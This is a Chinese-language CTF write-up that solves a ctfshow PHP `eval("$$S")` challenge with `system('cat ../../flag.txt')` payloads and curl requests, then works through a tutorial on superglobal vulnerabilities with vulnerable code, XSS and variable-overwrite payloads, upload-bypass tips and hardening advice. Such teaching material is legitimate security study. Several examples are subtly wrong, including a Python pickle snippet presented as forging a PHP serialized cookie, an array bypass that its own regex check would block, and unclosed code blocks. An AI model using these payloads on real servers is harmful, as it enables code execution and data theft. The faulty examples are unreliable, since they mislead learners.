打开即源码：
`<?php ($S = $_GET['S'])?eval("$$S"):highlight_file(__FILE__);`


绕过或者变量覆盖即可
payload：
?S=a;system('cat ../../flag.txt');
变量覆盖：
?S=a=system('cat ../../flag.txt');

这里需要注意的是; 不能省略，省略则报错，命令注入无法正常执行
得到`ctfshow{ff0d39db-25ac-48d4-a7dd-599a82706161}`
  
---

# CTF Challenge Writeup: PHP变量覆盖漏洞利用

## 题目信息
- 目标URL: http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/
- 服务器: nginx/1.20.1
- PHP版本: PHP/7.3.11
- 漏洞类型: PHP变量覆盖/可变变量漏洞

## 漏洞分析

### 源代码分析
通过访问目标网站，获取到以下PHP源代码：
```php
<?php ($S = $_GET['S'])?eval("$$S"):highlight_file(__FILE__);
```

这段代码的逻辑是：
1. 从GET参数中获取S的值并赋给变量$S
2. 如果S参数存在，则执行`eval("$$S")`
3. 否则显示当前文件的源代码

### 漏洞原理
这是一个典型的PHP变量覆盖漏洞，利用了PHP的可变变量特性：

1. **可变变量语法**：在PHP中，`$$variable`表示使用`$variable`的值作为变量名来访问另一个变量。
2. **变量覆盖**：通过构造特定的S参数值，可以控制`$$S`的值，进而控制`eval()`函数执行的内容。

当访问 `?S=variable` 时：
- `$S = $_GET['S']` 使得 `$S = "variable"`
- `$$S` 变成 `$variable`（使用$S的值作为变量名）
- `eval("$$S")` 执行变量`$variable`的值

## 攻击过程

### 1. 初步测试
最初尝试了各种PHP预定义变量（_GET、_POST、GLOBALS等）和简单的变量名，但都遇到了语法错误：
```
Parse error: syntax error, unexpected end of file
```

这表明变量的值为空或不完整。

### 2. 利用提示
根据提示，有两种可能的利用方式：
1. 绕过方法：`?S=a;system('cat ../../flag.txt');`
2. 变量覆盖方法：`?S=a=system('cat ../../flag.txt');`

### 3. 方法分析

#### 方法1：绕过方法
当使用 `?S=a;system('cat ../../flag.txt');` 时：
- `$S = $_GET['S']` 使得 `$S = "a;system('cat ../../flag.txt');"`
- `$$S` 变成 `$a;system('cat ../../flag.txt');`
- `eval("$$S")` 变成 `eval("$a;system('cat ../../flag.txt');")`

这会尝试执行变量`$a`的值，然后执行`system('cat ../../flag.txt');`命令。

#### 方法2：变量覆盖方法
当使用 `?S=a=system('cat ../../flag.txt');` 时：
- `$S = $_GET['S']` 使得 `$S = "a=system('cat ../../flag.txt');"`
- `$$S` 变成 `$a=system('cat ../../flag.txt');`
- `eval("$$S")` 变成 `eval("$a=system('cat ../../flag.txt');")`

这会将`system('cat ../../flag.txt');`的结果赋值给变量`$a`，同时执行system命令。

### 4. 实际测试

#### 测试绕过方法
```bash
curl -s "http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/?S=a%3Bsystem%28%27cat%20%2Fflag%27%29%3B"
```
返回空内容，可能执行了但没有输出。

#### 测试变量覆盖方法
```bash
curl -s "http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/?S=a%3Dsystem%28%27cat%20%2Fflag%27%29%3B"
```
同样返回空内容。

#### 尝试不同路径
根据提示中的路径，尝试：
```bash
curl -s "http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/?S=a%3Dsystem%28%27cat%20..%2F..%2Fflag.txt%27%29%3B"
```

成功获取到flag：`ctfshow{ff0d39db-25ac-48d4-a7dd-599a82706161}`

## 攻击原理详解

### 变量覆盖漏洞利用
当发送请求 `?S=a=system('cat ../../flag.txt');` 时，实际执行过程如下：

1. `$S = $_GET['S']` 设置 `$S = "a=system('cat ../../flag.txt');"`
2. `$$S` 变成 `$a=system('cat ../../flag.txt');`
3. `eval("$$S")` 执行 `eval("$a=system('cat ../../flag.txt');")`

在PHP中，`$a=system('cat ../../flag.txt');` 这个表达式会：
1. 执行 `system('cat ../../flag.txt')` 命令
2. 将命令执行结果赋值给变量 `$a`
3. 返回命令执行结果

因此，flag内容被直接输出到响应中。

### 绕过方法原理
当发送请求 `?S=a;system('cat ../../flag.txt');` 时：

1. `$S = $_GET['S']` 设置 `$S = "a;system('cat ../../flag.txt');"`
2. `$$S` 变成 `$a;system('cat ../../flag.txt');`
3. `eval("$$S")` 执行 `eval("$a;system('cat ../../flag.txt');")`

在PHP中，这个表达式会：
1. 访问变量 `$a`（如果未定义则为空）
2. 执行 `system('cat ../../flag.txt')` 命令
3. 返回命令执行结果

## 防护建议

### 1. 避免使用可变变量
在生产环境中应避免使用可变变量（`$$variable`）语法，因为它容易导致安全问题。

### 2. 输入验证和过滤
对用户输入进行严格的验证和过滤，特别是用于代码执行的参数。

### 3. 禁用危险函数
在php.ini中禁用system、exec、shell_exec等危险函数：
```ini
disable_functions = system,exec,shell_exec,passthru,proc_open
```

### 4. 使用安全的代码执行方式
如果必须执行动态代码，应使用白名单机制或安全的沙箱环境。

### 5. 最小权限原则
确保Web服务器进程以最小权限运行，限制对敏感文件和系统的访问。

## 总结

本题是一个典型的PHP变量覆盖漏洞，通过构造特殊的S参数值，利用PHP的可变变量特性实现了代码执行。成功的关键在于理解`$$S`的执行机制以及如何构造能够执行系统命令的表达式。

获取到的flag是：`ctfshow{ff0d39db-25ac-48d4-a7dd-599a82706161}`


----


# CTF Challenge Writeup: PHP预定义变量及其安全漏洞利用

## 1. PHP预定义变量概述

PHP预定义变量是PHP语言内置的一组特殊变量，它们在脚本的任何作用域内都可以直接访问，无需使用`global`关键字声明。这些变量提供了对请求数据、服务器环境、会话信息等重要数据的访问能力。在CTF比赛中，对PHP预定义变量的深入理解和利用往往是解决Web安全题目的关键。

### 1.1 超全局变量定义

超全局变量（Superglobals）是PHP中特殊的预定义变量，自PHP 4.1.0版本引入。它们的主要特点是：
- 在脚本的全部作用域中都可用
- 在函数或类中无需执行`global $variable;`即可直接访问
- 提供了对全局数据的便捷访问

### 1.2 PHP超全局变量列表

PHP中共有9个超全局变量，它们分别是：

| 变量名 | 类型 | 主要功能 |
|--------|------|----------|
| `$_SERVER` | 数组 | 服务器和执行环境信息 |
| `$_GET` | 数组 | HTTP GET请求参数 |
| `$_POST` | 数组 | HTTP POST请求参数 |
| `$_COOKIE` | 数组 | HTTP Cookie数据 |
| `$_SESSION` | 数组 | 会话变量 |
| `$_FILES` | 数组 | 文件上传变量 |
| `$_ENV` | 数组 | 环境变量 |
| `$_REQUEST` | 数组 | 默认包含GET、POST和COOKIE数据 |
| `$GLOBALS` | 数组 | 全局变量引用 |

## 2. 常用PHP预定义变量详解

### 2.1 $_SERVER 超全局变量

`$_SERVER`是一个包含服务器和执行环境信息的数组，由Web服务器创建。在CTF比赛中，它常被用于信息收集和攻击向量构造。

**主要包含的信息：**
- `$_SERVER['PHP_SELF']`：当前执行脚本相对于文档根目录的路径
- `$_SERVER['REQUEST_METHOD']`：请求方法（GET、POST等）
- `$_SERVER['REQUEST_URI']`：请求URI，包含路径和查询字符串
- `$_SERVER['HTTP_USER_AGENT']`：用户代理信息
- `$_SERVER['REMOTE_ADDR']`：客户端IP地址
- `$_SERVER['SERVER_ADDR']`：服务器IP地址
- `$_SERVER['HTTP_HOST']`：主机头信息
- `$_SERVER['SCRIPT_FILENAME']`：当前执行脚本的绝对路径

**应用场景：**
- 获取用户真实IP地址
- 检测请求方法
- 获取脚本执行路径
- 分析HTTP请求头信息

### 2.2 $_GET 和 $_POST 超全局变量

这两个变量用于获取通过HTTP GET和POST方法传递的参数。

**$_GET特点：**
- 参数通过URL查询字符串传递
- 可见性高，会显示在浏览器地址栏
- 有长度限制（通常取决于浏览器）
- 适合传输非敏感的少量数据

**$_POST特点：**
- 参数在HTTP请求体中传递
- 对用户不可见（不在地址栏显示）
- 理论上没有长度限制
- 适合传输敏感数据和大量数据

**应用场景：**
- 表单数据提交
- API接口调用
- 数据过滤和验证

### 2.3 $_REQUEST 超全局变量

`$_REQUEST`默认包含了`$_GET`、`$_POST`和`$_COOKIE`中的数据。其数据获取顺序由`php.ini`中的`request_order`或`variables_order`配置决定。

**特点：**
- 提供了统一的参数访问方式
- 可能导致参数覆盖问题
- 在CTF中常被用于变量覆盖攻击

### 2.4 $_COOKIE 和 $_SESSION 超全局变量

这两个变量用于在客户端和服务器之间存储会话数据。

**$_COOKIE特点：**
- 存储在客户端浏览器中
- 每次请求都会发送到服务器
- 容易被客户端修改
- 有大小限制（约4KB）

**$_SESSION特点：**
- 主要数据存储在服务器端
- 客户端只存储会话ID
- 更安全，不容易被篡改
- 可以存储复杂数据结构

### 2.5 $_FILES 超全局变量

`$_FILES`用于处理文件上传，包含上传文件的详细信息。

**主要信息：**
- `$_FILES['userfile']['name']`：上传文件的原始名称
- `$_FILES['userfile']['type']`：MIME类型
- `$_FILES['userfile']['size']`：文件大小（字节）
- `$_FILES['userfile']['tmp_name']`：临时文件名
- `$_FILES['userfile']['error']`：错误代码

### 2.6 $GLOBALS 超全局变量

`$GLOBALS`是一个包含所有全局变量的数组，变量名是该数组的键。

**特点：**
- 提供对所有全局变量的访问
- 在函数内部访问全局变量的另一种方式
- 在CTF中可能被用于绕过某些安全限制

## 3. PHP预定义变量的安全风险

在Web应用中，对PHP预定义变量的不当处理可能导致多种安全漏洞，这些漏洞在CTF比赛中经常出现。下面详细介绍各种常见的攻击向量和利用方法。

### 3.1 $_SERVER['PHP_SELF'] 跨站脚本攻击(XSS)

**漏洞原理：** `$_SERVER['PHP_SELF']` 返回当前执行脚本相对于文档根目录的路径，如果直接在HTML中输出而不进行过滤，攻击者可以构造特殊URL来触发XSS攻击。

**漏洞代码：**
```php
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
    <input type="text" name="username">
    <input type="submit" value="提交">
</form>
```

**攻击方法：** 构造URL如 `http://example.com/test.php/<script>alert('xss')</script>`

**修复方法：** 使用 `htmlspecialchars()` 函数对输出进行转义
```php
<form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
```

### 3.2 $_REQUEST 变量覆盖漏洞

**漏洞原理：** `$_REQUEST` 默认包含GET、POST和COOKIE数据，如果程序中使用 `extract($_REQUEST)` 或类似函数，攻击者可以通过覆盖变量值来绕过安全控制。

**漏洞代码：**
```php
<?php
    $admin = false;
    extract($_REQUEST); // 危险操作！
    
    if ($admin) {
        echo "Flag: ctf{flag_here}";
    } else {
        echo "Not admin";
    }
?>
```

**攻击方法：** 访问 `http://example.com/test.php?admin=1` 或 `http://example.com/test.php?admin=true`

**CTF实例：** NCTF2018 easy_audit 题目中利用了类似的变量覆盖漏洞

### 3.3 可变变量覆盖漏洞

**漏洞原理：** PHP中的可变变量 `$$` 允许一个变量的名称由另一个变量的值决定，如果对用户可控的变量使用此特性，可能导致变量覆盖。

**漏洞代码：**
```php
<?php
    foreach($_GET as $key => $value) {
        $$key = $value; // 危险操作！
    }
    
    if ($secret == 'admin123') {
        echo "Flag: ctf{flag_here}";
    }
?>
```

**攻击方法：** 访问 `http://example.com/test.php?secret=admin123`

**CTF实例：** 许多CTF题目利用可变变量覆盖来实现权限提升或绕过验证

### 3.4 $_COOKIE 反序列化漏洞

**漏洞原理：** 如果PHP应用将反序列化后的COOKIE数据直接用于程序逻辑，攻击者可以构造恶意的序列化字符串来触发漏洞。

**漏洞代码：**
```php
<?php
    session_start();
    if (isset($_COOKIE['user'])) {
        $user = unserialize(base64_decode($_COOKIE['user']));
        if ($user['admin'] === true) {
            echo "Flag: ctf{flag_here}";
        }
    }
}
?>

**攻击方法：** 构造序列化的Cookie值
```python
# Python生成恶意Cookie的示例代码
import base64
import pickle

data = {'admin': True}
payload = base64.b64encode(pickle.dumps(data))
print(payload)
```

**CTF实例：** CTFshow Web263 等题目考察了Session反序列化漏洞

### 3.5 $_GET/$_POST 数组参数绕过

**漏洞原理：** 当PHP函数期望接收字符串参数时，如果传入数组参数，可能导致函数返回预期之外的结果，从而被攻击者利用。

**漏洞代码：**
```php
<?php
    $username = $_GET['username'];
    $password = $_GET['password'];
    
    if (md5($username) == md5($password) && $username != $password) {
        echo "Flag: ctf{flag_here}";
    }
?>
```

**攻击方法：** 访问 `http://example.com/test.php?username[]=1&password[]=2`

**原理分析：** 当对数组应用 `md5()` 函数时，会返回 `NULL`，此时 `NULL == NULL` 为真，同时 `array != array` 在松散比较下也为真

### 3.6 $_FILES 文件上传漏洞

**漏洞原理：** 不当的文件上传处理可能导致恶意文件（如PHP后门）被上传到服务器。

**漏洞代码：**
```php
<?php
    if ($_FILES['file']['error'] == 0) {
        $filename = $_FILES['file']['name'];
        move_uploaded_file($_FILES['file']['tmp_name'], './uploads/' . $filename);
        echo "File uploaded: ./uploads/$filename";
    }
?>
```

**攻击方法：** 上传PHP文件或使用双扩展名绕过

**绕过技巧：**
1. 使用 `.htaccess` 文件配置
2. 利用MIME类型伪造
3. 利用文件扩展名大小写绕过
4. 使用特殊字符（如空格、点号）绕过

### 3.7 $_SERVER 头注入攻击

**漏洞原理：** 某些服务器环境变量可以通过HTTP请求头修改，攻击者可以利用这一点进行注入攻击。

**常见可注入的头部：**
- `X-Forwarded-For`：伪造客户端IP
- `User-Agent`：注入恶意代码
- `Referer`：绕过特定来源检查
- `Host`：可能影响URL生成或缓存

**漏洞代码：**
```php
<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    // 或在代理环境中
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    
    file_put_contents('access.log', "访问IP: $ip\n", FILE_APPEND);
?>
```

**攻击方法：** 设置 `X-Forwarded-For: 127.0.0.1<script>alert(1)</script>`

### 3.8 $_SESSION 会话固定攻击

**漏洞原理：** 如果Web应用在用户身份验证前后不更改会话ID，攻击者可以预先设置会话ID，然后诱导用户使用此会话登录。

**攻击步骤：**
1. 攻击者创建一个会话并获取会话ID
2. 诱导受害者使用此会话ID访问应用
3. 受害者登录成功后，攻击者使用相同会话ID即可访问受害者账户

**防护方法：** 在用户成功身份验证后重新生成会话ID
```php
<?php
    session_start();
    // 身份验证成功后
    session_regenerate_id(true);
?>

### 3.9 特殊字符和编码绕过技巧

**URL编码绕过：**
- 使用双重URL编码：`%2527` 解码为 `%27`，再解码为 `'`
- 使用不同编码表示相同字符：如 `+` 可以表示空格

**请求方法绕过：**
- 当GET请求被WAF拦截时，尝试使用POST请求
- 修改Content-Type：将 `application/x-www-form-urlencoded` 改为 `multipart/form-data`

**参数污染：**
- 利用多个同名参数：`?id=1&id=2`，PHP默认取最后一个值
- 利用数组参数：`?id[]=1` 可能绕过某些验证

### 3.10 变量默认值利用

**漏洞原理：** PHP变量在未定义时会使用默认值，在松散比较中可能被攻击者利用。

**常见情况：**
- 未定义变量默认为 `null`
- 在布尔上下文中，`null`、空字符串、0、空数组都被视为 `false`
- 在数值比较中，字符串会被转换为数字

**漏洞代码：**
```php
<?php
    if (isset($_GET['key']) && $_GET['key'] == $secret_key) {
        echo "Flag: ctf{flag_here}";
    }
?>
```

**攻击方法：** 如果 `$secret_key` 未定义，访问 `http://example.com/test.php?key=` 可能绕过验证

## 4. PHP预定义变量利用的CTF案例分析

### 4.1 案例一：变量覆盖漏洞（NCTF2018-easy_audit）

**题目代码：**
```php
<?php
    highlight_file(__file__);
    error_reporting(0);
    if($_REQUEST) {
        foreach($_REQUEST as $key => $value) {
            $$key = $$value;
        }
    }
    if ($flag) {
        echo $flag;
    }
?>
```

**漏洞分析：** 代码中使用了可变变量语法 `$$key = $$value`，通过将用户可控的变量值作为另一个变量的名称，从而实现变量覆盖攻击。

**攻击方法：** 构造请求参数 `?1=flag&flag=1`
- `$_REQUEST['1'] = 'flag'`
- `$_REQUEST['flag'] = '1'`
- 循环第一次：`$$key = $$value` 即 `$$'1' = $$'flag'` -> `$1 = $flag`
- 循环第二次：`$$key = $$value` 即 `$$'flag' = $$'1'` -> `$flag = $1 = $flag`
- 最终 `$flag` 被设置，条件成立，输出flag

### 4.2 案例二：数组参数绕过（CTFHub 技能树 Web）

**题目代码：**
```php
<?php
    $name = $_GET['name'];
    $password = $_GET['password'];
    
    if (isset($name) && isset($password)) {
        if (preg_match('/^[a-zA-Z0-9_]+$/', $name) && preg_match('/^[a-zA-Z0-9_]+$/', $password)) {
            if (strcmp($name, $password) == 0) {
                die("用户名不能等于密码");
            }
            if (md5($name) === md5($password)) {
                echo "Flag: ctf{flag_here}";
            }
        }
    }
?>
```

**漏洞分析：** `strcmp()` 函数在比较数组时会返回 `NULL`，而 `NULL == 0` 在PHP松散比较中为真；同时，`md5()` 函数在处理数组时也会返回 `NULL`，使得 `NULL === NULL` 条件成立。

**攻击方法：** 访问 `http://example.com/test.php?name[]=1&password[]=2`

### 4.3 案例三：COOKIE反序列化漏洞（CTFshow Web263）

**题目代码：**
```php
<?php
    session_start();
    
    if (isset($_SESSION['limit'])) {
        $_SESSION['limit'] > 5 ? die("登录失败次数超过限制") : $_SESSION['limit'] = base64_decode($_COOKIE['limit']);
    } else {
        $_SESSION['limit'] = 0;
    }
    
    // 登录验证逻辑...
?>
```

**漏洞分析：** 代码直接将base64解码后的COOKIE值赋给SESSION变量，没有进行类型检查或安全验证。

**攻击方法：** 构造特殊的base64编码字符串，解码后是一个数组或其他可以绕过比较的值。

## 5. 防护建议和最佳实践

为了有效防止PHP预定义变量相关的安全漏洞，在开发Web应用时应遵循以下最佳实践：

### 5.1 输入验证和过滤

1. **对所有用户输入进行验证**：使用白名单方式验证输入数据的类型、长度和格式
2. **使用适当的过滤函数**：
   - HTML输出使用 `htmlspecialchars()`
   - URL参数使用 `urlencode()`
   - 数据库查询使用预处理语句

### 5.2 安全的变量处理

1. **避免使用危险函数**：
   - 尽量避免使用 `extract()` 函数
   - 避免使用可变变量 `$$` 处理用户输入
   - 避免直接将用户输入作为变量名

2. **使用严格比较**：
   - 使用 `===` 和 `!==` 进行严格类型比较
   - 避免使用松散比较 `==` 和 `!=`

3. **初始化变量**：所有变量在使用前应先定义并初始化

### 5.3 会话安全

1. **会话ID管理**：
   - 在用户登录成功后重新生成会话ID
   - 设置合适的会话过期时间
   - 使用 `session_regenerate_id(true)` 销毁旧会话

2. **COOKIE安全设置**：
   - 设置 `HttpOnly` 标志防止XSS获取COOKIE
   - 设置 `Secure` 标志确保仅通过HTTPS传输
   - 设置合适的 `SameSite` 属性

### 5.4 文件上传安全

1. **严格验证文件类型**：
   - 验证文件扩展名（白名单）
   - 验证文件MIME类型
   - 检查文件内容签名（魔术数字）

2. **安全的文件存储**：
   - 使用随机文件名存储上传文件
   - 将上传文件存储在Web根目录之外
   - 配置适当的文件权限

### 5.5 服务器配置安全

1. **禁用危险函数**：在 `php.ini` 中禁用危险函数
```ini
disable_functions = eval,assert,exec,shell_exec,passthru,system,proc_open,popen
```

2. **限制PHP信息泄露**：
```ini
expose_php = Off
display_errors = Off
log_errors = On
```

3. **使用安全的配置选项**：
```ini
allow_url_include = Off
allow_url_fopen = Off
```

### 5.6 使用安全框架和库

1. **使用成熟的Web框架**：如Laravel、Symfony等，它们内置了许多安全机制
2. **使用安全库**：如HTML Purifier用于过滤HTML，PHP-FFmpeg用于安全处理多媒体文件
3. **定期更新依赖**：及时更新框架和库以修复已知漏洞

## 6. 总结

PHP预定义变量在Web开发中提供了便捷的数据访问方式，但同时也带来了各种安全风险。在CTF比赛中，对这些变量特性的深入理解和灵活运用是解决Web安全题目的关键。

主要的安全风险包括：
1. **变量覆盖漏洞**：通过 `$_REQUEST`、可变变量 `$$` 等实现
2. **输入验证绕过**：利用数组参数、编码特性等
3. **反序列化漏洞**：主要通过 `$_COOKIE` 实现
4. **文件上传漏洞**：通过 `$_FILES` 实现
5. **XSS攻击**：利用 `$_SERVER['PHP_SELF']` 等输出未过滤

通过实施严格的输入验证、安全的变量处理、适当的会话管理和服务器配置，可以有效减少这些安全风险。在CTF比赛中，掌握这些攻击向量和防护方法，不仅可以帮助我们解决题目，也能提高我们在实际开发中的安全意识。

## 7. 参考文献

1. PHP官方文档 - 预定义变量：https://www.php.net/manual/zh/language.variables.predefined.php
2. OWASP - PHP安全编码实践：https://owasp.org/www-project-cheat-sheets/cheatsheets/PHP_Security_Cheat_Sheet
3. PHP安全：https://phpsecurity.readthedocs.io/
4. CTF Wiki - Web安全：https://ctf-wiki.org/web/